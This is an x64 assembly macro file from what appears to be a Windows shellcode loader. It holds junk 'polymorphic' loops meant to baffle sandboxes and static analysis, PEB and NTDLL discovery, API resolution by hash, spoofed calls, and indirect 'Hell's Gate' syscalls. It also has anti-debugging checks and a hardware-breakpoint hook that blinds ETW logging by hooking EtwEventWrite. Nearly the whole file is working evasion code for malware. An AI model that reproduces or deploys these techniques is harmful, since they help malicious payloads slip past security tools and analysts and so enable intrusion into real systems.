
extern resolve_ssn:proc
extern InitSysCall:proc
extern PrepareSysCall:proc
extern SpoofCall:proc
extern SysCallExec:proc
extern resolve_module:proc
extern resolve_api:proc

HWBP_ADD equ 1
HWBP_DEL equ 0

; Polymorphic calculations that confuses static analysis and sandboxes
; This must be invoked after `init_sc`
JUNK_TO_BAFFLE macro
	mov rcx, SHELLSIZE
	mov rax, qword ptr [sc]
	calculate:
	rol rax, 13
	xor rax, qword ptr [sc + 08h]
	not rax
	ror rax, 7
	add rax, qword ptr [sc + 0Ah]
	bswap rax
	loop calculate
endm

GET_TSC macro
	rdtsc
	shl rdx, 32
	or rax, rdx
endm

IS_VALID_PTR macro shit_lbl
	mov rdx, rax
	shr rdx, 14h
	and rdx, 0FFh
	jz shit_lbl
	mov rdx, rax
	shr rdx, 1Ch
	and rdx, 0FFh
	jz shit_lbl
	mov rdx, rax
	shr rdx, 24h
	and rdx, 0Fh
	jz shit_lbl
endm

; This had better invoked in the entrypoint
; Sorry! I'm too lazy and don't have the passion to write comments explaining each line
; Try to understand the code yourself :D
; Summary -> Prepares shellcode, tries to find the PEB and NTDLL base addresses, and initializes the use of indirect syscalls.
;         We use two techniques to find PEB and NTDLL
;           1- We are searching for an address which points to the ReadImageFilExecOptions in the lower
;            portion of the address space, and then subtracting 1 which will give us our PEB.
;           2- Alternative Solution: We try to get RtlUserThreadStart address to get ntdll base address
;            which facilitate using indirect syscalls, then we do indirect NtQueryInformationProcess syscall to find PEB.
INIT_ASMLDR macro
	call init_sc
	JUNK_TO_BAFFLE
	xor rcx, rcx
	find_shit:
	cmp rcx, 2000h
	je alternative_solution
	inc rcx
	mov rax, rsp
	sub rax, sizeof qword 
	mov rax, qword ptr [rax]
	mov rdx, rax
	and rdx, 0FFFh
	cmp rdx, 1h
	jne find_shit
	mov rdx, rax
	shr rdx, 28h
	test rdx, rdx
	jz find_shit
	IS_VALID_PTR find_shit
	dec rax
	mov pProcEnvBlock, rax
	mov rax, qword ptr [rax + 18h]
	mov rax, qword ptr [rax + 20h]
	mov rax, qword ptr [rax]
	mov rax, qword ptr [rax + 20h]
	mov hNtDll, rax
	call InitSysCall
	jmp peb_ntdll_resolve_done

	alternative_solution:
	mov rax, qword ptr [rsp + 30h]
	mov rdx, rax
	shr rdx, 30h
	test rdx, rdx
	jnz ldr_finish
	IS_VALID_PTR ldr_finish
	find_shit_2:
	dec rax
	cmp word ptr [rax], 5A4Dh
	jne find_shit_2
	xor rcx, rcx
	mov ecx, dword ptr [rax + 3Ch]
	cmp ecx, 40h
	jle find_shit_2
	cmp ecx, 400h
	jg find_shit_2
	cmp dword ptr [rax + rcx], 4550h
	jne find_shit_2
	mov hNtDll, rax
	call InitSysCall
	mov rcx, hNtDll
	mov rdx, 95D5B9B1D034FC62h
	call resolve_api
	mov rcx, rax
	call resolve_ssn
	; Prepare for the call
	mov cx, ax
	call PrepareSysCall            ; Hell gate
	mov rcx, -1                    ; Current Process
	xor rdx, rdx                   ; ProcessInformationClass=ProcessBasicInformation
	sub rsp, 30h                   ; Memory for PROCESS_BASIC_INFORMATION 
	mov r8, rsp                    ; SystemInformation reference
	mov r9, 30h                    ; sizeof(PROCESS_BASIC_INFORMATION)
	push 0h                        ; ReturnLength = NULL
	call SysCallExec

	pop rcx                        ; Get rid of the f*cking fifth param
	mov rdx, qword ptr [rsp + 8h]  ; PebBaseAddress
	add rsp, 30h
	cmp eax, 0                     ; Check NT Status
	jl ldr_finish
	mov pProcEnvBlock, rdx
	peb_ntdll_resolve_done:
	call start_fake_workload
	mov rcx, KEYSIZE
	call fake_workload
endm

KILL_DEBUGGERS macro
	; Setup a new frame
	push rbp
	mov rbp, rsp
	sub rsp, 520h                  ; Memory for CONTEXT, OBJECT_ATTRIBUTES, CLIENT_ID and Kerenel32 Handle
	;------------------
	
	lea rcx, szK32                 ; RCX => Pointer to L"KERNEL32.dll"
	call resolve_module            ; Get a handle on KERNEL32
	mov qword ptr [rbp - 8h], rax  ; Save hKernel32
	
	; resolve_api( hKernel32, hashof("IsDebuggerPresent") )
	mov rcx, rax
	mov rdx, 79E6FD86E6A24847h
	call resolve_api
	;------------------------------

	push rax
	call SpoofCall
	test rax, rax
	jnz ldr_exit

	; resolve_api( hKernel32, hashof("CheckRemoteDebuggerPresent") )
	mov rcx, qword ptr [rbp - 8h]
	mov rdx, 0BC8F0BB06638C15h
	call resolve_api
	;------------------------------

	push 0h
	mov rcx, -1
	mov rdx, rsp
	push rax
	call SpoofCall
	pop rax
	test rax, rax
	jnz ldr_exit


	mov rcx, pProcEnvBlock
	movzx rax, byte ptr [rcx + 2h]  ; PPEB->BeingDebugged
	test al, al
	jnz ldr_exit
	mov eax, dword ptr [rcx + 0BCh] ; PPEB->NtGlobalFlag
	and eax, 70h
	jnz ldr_exit

	mov rax, hThread
	test rax, rax
	jnz skip_get_thread

	mov eax, dwProcId
	test eax, eax
	jnz skip_getprocid
	; resolve_api( hKernel32, hashof("GetCurrentProcessId") )
	mov rcx, qword ptr [rbp - 8h]
	mov rdx, 0D30B3BA2A3BF64B4h
	call resolve_api
	push rax
	call SpoofCall
	mov dwProcId, eax
	;------------------------------
	skip_getprocid:
	mov eax, dwThreadId
	test eax, eax
	jnz skip_getthreadid
	; resolve_api( hKernel32, hashof("GetCurrentThreadId") )
	mov rcx, qword ptr [rbp - 8h]
	mov rdx, 3CB2C3E3D29E428Dh
	call resolve_api
	push rax
	call SpoofCall
	mov dwThreadId, eax
	;------------------------------
	skip_getthreadid:
	; Fills ctx, obj_attrs, and client_id with zeros
	push rdi
	lea rdi, qword ptr [rsp + 8h]
	cld
	mov rcx, 510h
	xor al, al
	rep stosb
	pop rdi
	;-------------

	; resolve_api( hNtDLL, hashof("NtOpenThread") )
	mov rcx, hNtDll
	mov rdx, 0C12C7B44FB8A31D1h
	call resolve_api
	;------------------------------

	mov rcx, rax
	call resolve_ssn

	; Prepare for the call
	mov cx, ax
	call PrepareSysCall            ; Hell gate
	lea rcx, hThread
	mov rdx, 001F03FFh             ; THREAD_ALL_ACCESS
	lea r8, qword ptr [rsp + 4D0h] ; obj_attrs
	mov qword ptr [r8], 30h        ; obj_attrs->Length = 0x30
	lea r9, qword ptr [rsp + 500h] ; client_id
	mov eax, dwProcId
	mov dword ptr [r9], eax
	mov eax, dwThreadId
	mov dword ptr [r9 + 8h], eax
	call SysCallExec
	cmp eax, 0h
	jl ldr_exit

	skip_get_thread:

	; resolve_api( hNtDLL, hashof("NtGetContextThread") )
	mov rcx, hNtDll
	mov rdx, 63BF2E8A9E0E1A44h
	call resolve_api
	;------------------------------

	; Get the SSN of that call
	mov rcx, rax
	call resolve_ssn

	; Prepare for the call
	mov cx, ax
	call PrepareSysCall            ; Hell gate
	mov rcx, hThread               ; Current Thread
	mov rdx, rsp                   ; &ctx
	mov dword ptr [rdx + 30h], 0BCh ; pCtx->ContextFlags = CONTEXT_DEBUG_REGISTERS
	call SysCallExec
	cmp eax, 0h                    ; Check NT Status
	jl ldr_exit
	mov rcx, 4
	check_hwbp: ; Check Debugging registers if one of them is set
	mov rax, qword ptr [rsp + 40h + rcx * 8] ; Get DRx (all next to each other starting at offset 0x48)
	test rax, rax
	jz check_next
	mov rax, 1
	jmp ldr_exit
	check_next:
	loop check_hwbp

	; resolve_api( hNtDLL, hashof("NtQueryInformationProcess") )
	mov rcx, hNtDll
	mov rdx, 95D5B9B1D034FC62h
	call resolve_api
	;------------------------------

	; Get the SSN of that call
	mov rcx, rax
	call resolve_ssn
	
	; Prepare for the call
	mov cx, ax
	call PrepareSysCall            ; Hell gate
	mov rcx, -1                    ; Current Process
	mov rdx, 7h                    ; SystemDeviceInformation
	push 0h                        ; Memory for SystemInformation
	mov r8, rsp                    ; SystemInformation reference
	mov r9, sizeof qword           ; SystemInformationLength
	push 0h                        ; ReturnLength = NULL
	call SysCallExec

	pop rcx                        ; Get rid of the f*cking fifth param
	pop rcx                        ; The information we read from the function
	cmp eax, 0                     ; Check NT Status
	jl ldr_exit
	mov rax, rcx                   ; Check Debug Port
	test rax, rax
	jnz ldr_exit

	xor rax, rax
	add rsp, 520h
	pop rbp
endm

HARADWARE_BREAKPOINT macro bFlag ; True=ADD, FALSE=REMOVE
	sub rsp, 4D0h

	; Fills ctx with zeros
	push rdi
	lea rdi, qword ptr [rsp + 8h]
	cld
	mov rcx, 4D0h
	xor al, al
	rep stosb
	pop rdi
	;-------------

	; resolve_api( hNtDLL, hashof("NtGetContextThread") )
	mov rcx, hNtDll
	mov rdx, 63BF2E8A9E0E1A44h
	call resolve_api
	;------------------------------

	; Get the SSN of that call
	mov rcx, rax
	call resolve_ssn

	; Prepare for the call
	mov cx, ax
	call PrepareSysCall            ; Hell gate
	mov rdx, rsp                   ; &ctx
	mov dword ptr [rdx + 30h], 0BCh ; pCtx->ContextFlags = CONTEXT_DEBUG_REGISTERS
	mov rcx, hThread               ; Current Thread
	call SysCallExec

	; resolve_api( hNtDLL, hashof("EtwEventWrite") )
	mov rcx, hNtDll
	mov rdx, 173CBAAC24A8D022h
	call resolve_api
	mov rdx, bFlag
	test rdx, rdx
	cmovz rax, rdx
	mov qword ptr [rsp + 48h], rax  ; Set/Unset the Exception callback to DR0
	mov rax, qword ptr [rsp + 70h]
	mov al, dl
	mov qword ptr [rsp + 70h], rax  ; Enable/Disable a hardware BP on execution (DR7)

	; resolve_api( hNtDLL, hashof("NtSetContextThread") )
	mov rcx, hNtDll
	mov rdx, 0F359FB6F308BE0D0h
	call resolve_api
	;------------------------------

	; Get the SSN of that call
	mov rcx, rax
	call resolve_ssn

	; Prepare for the call
	mov cx, ax
	call PrepareSysCall            ; Hell gate
	mov rcx, hThread               ; Current Thread
	mov rdx, rsp                   ; &ctx
	call SysCallExec
	add rsp, 4D0h
endm